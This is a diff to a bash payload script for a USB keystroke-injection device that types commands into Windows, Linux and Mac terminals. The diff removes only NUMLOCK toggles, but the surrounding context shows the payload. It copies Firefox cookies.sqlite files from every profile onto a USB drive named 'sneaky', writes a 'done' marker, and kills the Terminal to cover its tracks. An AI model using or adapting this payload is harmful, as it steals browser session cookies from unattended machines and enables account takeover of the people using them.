@@ -1,8 +1,6 @@
 #!/bin/bash
 
 function quackWindows() {
-        # NUMLOCK only needed for us layout, get's ignored otherwise
-        Q NUMLOCK
 
         # open normal powershell (non admin)
         Q GUI r
@@ -34,14 +32,9 @@ function quackWindows() {
         Q ENTER
         Q ESCAPE
         Q ESCAPE
-
-        # cleanup numlock
-        Q NUMLOCK
 }
 
 function quackLinux() {
-        # NUMLOCK only needed for us layout, get's ignored otherwise
-        Q NUMLOCK
 
         # open terminal via search menu
         Q GUI
@@ -62,14 +55,9 @@ function quackLinux() {
 	Q STRING " 'done' > /media/"
 	Q STRING '$(users)/sneaky/done.txt && sync && exit'
 	Q ENTER
-
-        # cleanup numlock
-        Q NUMLOCK
 }
 
 function quackMac() {
-        # NUMLOCK only needed for us layout, get's ignored otherwise
-        Q NUMLOCK
 
 	# open mac terminal
         Q GUI SPACE
@@ -84,9 +72,6 @@ function quackMac() {
 	Q STRING ' "/Users/$(users)/Library/Application Support/Firefox/Profiles/\"* ; do cp -r $dir/cookies.sqlite /Volumes/sneaky/cookies$counter.sqlite 2>/dev/null ; ((counter=counter+1)) ; done && echo'
 	Q STRING " 'done' > /Volumes/sneaky/cookies.txt && sync && pkill -a Terminal"
 	Q ENTER
-
-	# cleanup numlock
-	Q NUMLOCK
 }
 
 case $1 in
